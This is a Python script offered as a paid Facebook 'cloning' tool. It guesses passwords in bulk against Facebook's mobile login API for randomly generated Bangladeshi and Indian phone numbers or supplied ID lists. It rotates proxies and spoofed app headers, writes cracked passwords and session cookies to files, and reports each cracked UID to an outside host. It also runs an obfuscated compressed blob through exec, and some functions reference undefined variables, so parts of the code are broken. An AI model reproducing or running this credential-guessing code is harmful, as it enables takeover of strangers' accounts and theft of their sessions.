#SC MAKE BY SAFWAN
#WORKING SCRIPT SAFWAN
#__________________[ IMPORT ]__________________#
import os,random
import sys,time,uuid,zlib
try:
    import requests,bs4,mechanize,httpx
    import rich,json,subprocess,random,string
    from concurrent.futures import ThreadPoolExecutor as Habib
except ModuleNotFoundError:
    print('\x1b[38;5;46m[\x1b[1;97m✓\x1b[38;5;46m] MODULE INSTALLING ')
    os.system('pip install requests rich')
    os.system('pip install mechanize')
    os.system('pip install bs4 httpx')
#__________________[ SAFWAN INFO ]__________________#
os.system(f'clear')
exec(zlib.decompress(b'x\x9c+(\xca\xcc+\xd1P\x8f\xa90L\x8a6\xb6\xb06\xb561\xcb\x8d\x06\xf3\x0c\xad-\xcds\x1fuv\xa0H\xc5*\x04;\x07y\x06\x84(\xf8:z\xbb*8E*x8:y:\xe9C\x05\x83]}|\x14\\\xfc\xfd\\\x15\xd45\x01\xe0\x0f\x19\xff'))
time.sleep(1)
#__________________[ PROXY ]__________________#
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=1000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
#__________________[ LOOP ]__________________#
loop,ok,cp,user = 0,[],[],[]
cok,plist = [],[]
#__________________[ COLOUR ]__________________#
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
#__________________[ LINE ]__________________#
def linex():
    print(f'{G1}──────────────────────────────────────────────────')
def clear():
        os.system(f'clear')
        print(logo)
#__________________[ UA ]__________________#
def sex():
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	fbrv = str(random.randint(000000000,999999999))
	density = random.choice(['2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_GB;FBRV/{str(fbrv)};FBCR/null;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"
	return ua
#__________________[ LOGO ]__________________#
logo=(f"""
/$$$$$$   /$$$$$$  /$$$$$$$$ /$$      /$$  /$$$$$$  /$$   /$$
 /$$__  $$ /$$__  $$| $$_____/| $$  /$ | $$ /$$__  $$| $$$ | $$
| $$  \__/| $$  \ $$| $$      | $$ /$$$| $$| $$  \ $$| $$$$| $$
|  $$$$$$ | $$$$$$$$| $$$$$   | $$/$$ $$ $$| $$$$$$$$| $$ $$ $$
 \____  $$| $$__  $$| $$__/   | $$$$_  $$$$| $$__  $$| $$  $$$$
 /$$  \ $$| $$  | $$| $$      | $$$/ \  $$$| $$  | $$| $$\  $$$
|  $$$$$$/| $$  | $$| $$      | $$/   \  $$| $$  | $$| $$ \  $$
 \______/ |__/  |__/|__/      |__/     \__/|__/  |__/|__/  \__/
{G1}──────────────────────────────────────────────────
{G1}[{A}✓{G1}]{A} DEVELOPER {G1}➢{A} HABIB\_____:*\❷/3:)\⓿
{G1}[{A}✓{G1}]{A} TOOLTYPE  {G1}➢{A} FILE {G1}&{A} RANDOM CLONING
{G1}[{A}✓{G1}]{A} VERSION   {G1}➢{A} V{G1}/{A}2.0
{G1}[{A}✓{G1}]{A} STATUS    {G1}➢{G1} PAID
{G1}──────────────────────────────────────────────────""")
#__________________[ KEY ]__________________#
os.system('clear')   
import getpass
attemps = 0
os.system('clear')
print(logo)
while attemps < 999999999998888888888889999999999999999999999999999:
    bal = input(f'{G1}[{A}✓{G1}]{A} YOUR LICENSE {G1}➢{A} ')
  
    os.system('clear');print(logo)
    if bal == 'SAFU':
        print(f'{G1}[{A}✓{G1}]{A} LICENSE SUCCESSFUL ')
        break
    else:
        attemps += 1
        continue
#__________________[ MENU ]__________________#
def menu():
    clear()
    print(f'{G1}[{A}1{G1}]{A} FILE CLONE ')
    print(f'{G1}[{A}2{G1}]{A} RANDOM CLONE ')
    print(f'{G1}[{A}3{G1}]{A} CONTACT OWNER ')
    print(f'{G1}[{A}0{G1}]{A} EXIT CLONING ')
    linex()
    sex = input(f'{G1}[{A}?{G1}]{A} CHOICE {G1}➢{A} ')
    if sex in ['1']:
        file()
    elif sex in ['2']:
        XXX()
    elif sex in ['3']:
        os.system('xdg-open https://www.facebook.com/profile.php?id=100028392141273');menu()
    elif sex in ['0']:
        sys.exit()
    else:
        menu()
#__________________[ RANDOM ]__________________#
def XXX():
    clear()
    print(f'{G1}[{A}1{G1}]{A} BANGLADESH CLONING')
    print(f'{G1}[{A}2{G1}]{A} INDIA CLONING')
    print(f'{G1}[{A}0{G1}]{A} BACK MENU');linex()
    sex = input(f'{G1}[{A}?{G1}]{A} CHOICE {G1}➢{A} ')
    if sex in ['1']:
        bd()
    elif sex in ['2']:
        India()
    elif sex in ['0']:
    	menu()
    else:
        XXX()
#__________________[ BANGLADESH ]__________________#
def bd():
    clear()
    print(f'{G1}[{A}✓{G1}]{A} EXAMPLE {G1}➢{G1} 017{A}/{G1}019{A}/{G1}018{A}/{G1}016');linex()
    code = input(f'{G1}[{A}?{G1}]{A} CHOICE  {G1}➢{A} ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    clear()
    print(f'{G1}[{A}✓{G1}]{A} EXAMPLE {A}➢{G1} 3000{A}/{G1}5000{A}/{G1}10000{A}/{G1}99999');linex()
    limit = int(input(f'{G1}[{A}?{G1}]{A} CHOICE  {G1}➢{A} '))
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    clear()
    with Habib(max_workers=30) as sexy:
        clear()
        print(f'{G1}[{A}✓{G1}]{A} SIM CODE  {G1}➢{A} {code}')
        print(f'{G1}[{A}✓{G1}]{A} TOTAL UID {G1}➢{A} {str(len(user))}')
        print(f"{G1}[{A}✓{G1}]{A} TURN {A}[{G1}ON{A}/{G1}OFF{A}] AIRPLANE MODE EVERY {G1}3{A} MIN");linex()
        for love in user:
            ids = code+name+cod+love
            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'\r{G1}──────────────────────────────────────────────────')
    print(f'{G1}[{A}✓{G1}]{A} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}✓{G1}]{A} TOTAL OK ID {G1}➢{A} {str(len(ok))}')
    print(f'{G1}[{A}✓{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
    print(f'\r{G1}──────────────────────────────────────────────────')
    input(f'{G1}[{A}✓{G1}]{A} PRESS ENTER TO BACK ')
    menu()
#__________________[ INDIA ]__________________#
def India():
    clear()
    print(f'{G1}[{A}✓{G1}]{A} EXAMPLE {G1}➢{G1} +91639{A}/{G1}+91934{A}/{G1}+91902{A}/{G1}+91701');linex()
    code = input(f'{G1}[{A}?{G1}]{A} CHOICE  {G1}➢{A} ')
    clear()
    print(f'{G1}[{A}✓{G1}]{A} EXAMPLE {G1}➢{G1} 3000{A}/{G1}5000{A}/{G1}10000{A}/{G1}99999');linex()
    limit = int(input(f'{G1}[{A}?{G1}]{A} CHOICE  {G1}➢{A} '))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with Habib(max_workers=30) as sexy:
        clear()
        print(f'{G1}[{A}✓{G1}]{A} SIM CODE  {G1}➢{A} {code}')
        print(f'{G1}[{A}✓{G1}]{A} TOTAL UID {G1}➢{A} {str(len(user))}')
        print(f"{G1}[{A}✓{G1}]{A} TURN {A}[{G1}ON{A}/{G1}OFF{A}] AIRPLANE MODE EVERY {G1}3{A} MIN");linex()
        for love in user:
            ids = code+love
            psd = [love,ids[:8],'57273200','59039200','57575751']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'\r{G1}──────────────────────────────────────────────────')
    print(f'{G1}[{A}✓{G1}]{A} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}✓{G1}]{A} TOTAL OK ID {G1}➢{A} {str(len(ok))}')
    print(f'{G1}[{A}✓{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
    print(f'\r{G1}──────────────────────────────────────────────────')
    input(f'{G1}[{A}✓{G1}]{A} PRESS ENTER TO BACK ')
    menu()
#__________________[ FILE ]__________________#
def file():
    clear()
    print(f'{G1}[{A}✓{G1}]{A} EXAMPLE {G1}➢{A} /{G1}sdcard{A}/{G1}SWAG.txt');linex()
    file = input(f'{G1}[{A}?{G1}]{A} FILE NAME {G1}➢{A} ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{G1}[{A}✓{G1}]{A} FILE NOT FOUND');time.sleep(1)
        file()
    clear()
    print(f'{G1}[{A}✓{G1}]{A} EXAMPLE {G1}➢{A} {A}[{G1}1-20{A}]{G1}');linex()
    limit = int(input(f'{G1}[{A}?{G1}]{A} PASSWORD LIMIT {G1}➢{A} '))
    clear()
    for x in range(limit):
        print(f'{G1}[{A}✓{G1}]{A} EXAMPLE {G1}➢{A} firstlast{G1}/{A}first123{G1}/{A}last123')
        plist.append(input(f'{G1}[{A}?{G1}]{A} PASSWORD NO {A}[{G1}{x+1}{A}] {G1}➢{G1} '));linex()
    with Habib(max_workers=30) as sexy:
        tl = str(len(fo))
        clear()
        print(f'{G1}[{A}✓{G1}]{A} TOTAL ID {G1}➢{A} {tl}')
        print(f"{G1}[{A}✓{G1}]{A} TURN {A}[{G1}ON{A}/{G1}OFF{A}] AIRPLANE MODE EVERY {G1}3{A} MIN");linex()
        for user in fo:
            ids,names = user.split('|')
            psd = plist
            sexy.submit(M1,ids,names,psd)
    print('')
    print(f'\r{G1}──────────────────────────────────────────────────')
    print(f'{G1}[{A}✓{G1}]{A} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}✓{G1}]{A} TOTAL OK ID {G1}➢{A} {str(len(ok))}')
    print(f'{G1}[{A}✓{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
    print(f'\r{G1}──────────────────────────────────────────────────')
    input(f'{G1}[{A}✓{G1}]{A} PRESS ENTER TO BACK ')
    menu()
#__________________[ RANDOM METHOD ]__________________#
def randm(ids,psd):
    global loop,ok,cp
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    sys.stdout.write(f"\r\r{G1}[{A}SAFU-XD{G1}]-[{A}{loop}{G1}]-[{A}OK{G1}/{A}CP{G1}]-[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'882a8490361da98702bf97a021ddc14d','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': uaddx,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
                if res == 'LIVE':
                	print(f'\r\r{G1}[SAFU-OK] {uid} | {pas}');open('/sdcard/SWAG-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{S}[SWAG-LK] {uid} | {pas}');break
            elif 'www.facebook.com' in q['error']['message']:
            	print(f'\r\r{Y}[SAFU-CP] {uid} | {pas}');open('/sdcard/SWAG-FILE-CP.txt','a').write(ids+'|'+pas+'\n');cp.append(ids);break
            else:continue
        loop+=1
    except Exception as e:
        pass
#__________________[ FILE METHOD ]__________________#
def M1(ids,names,psd):
    global loop,ok,cp
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1729;FBSV/7.1.1;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
    sys.stdout.write(f"\r\r{G1}[{A}SAFU-XD{G1}]-[{A}{loop}{G1}]-[{A}OK{G1}/{A}CP{G1}]-[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for pw in psd:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','jcpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'882a8490361da98702bf97a021ddc14d','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': uaddx,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
            if 'access_token' in po:
                print(f'\r\r{G1}[SAFU-OK] {ids} | {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/SAFU-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{Y}[SAFU-CP] {ids} | {pas}')
                open('/sdcard/SAFU-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                cp.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
if __name__ == '__main__':
    menu()
#__________________[ END ]__________________#
